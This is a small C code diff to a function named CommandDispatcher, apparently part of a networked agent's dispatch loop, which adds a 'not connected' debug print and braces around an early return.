@@ -27,8 +27,11 @@ VOID CommandDispatcher()
 
     do
     {
-        if ( ! Instance.Session.Connected )
+        if ( ! Instance.Session.Connected ){
+            puts("Instance not connected...");
             return;
+        }
+
 
         Sleep( Instance.Config.Sleeping * 1000 );
 
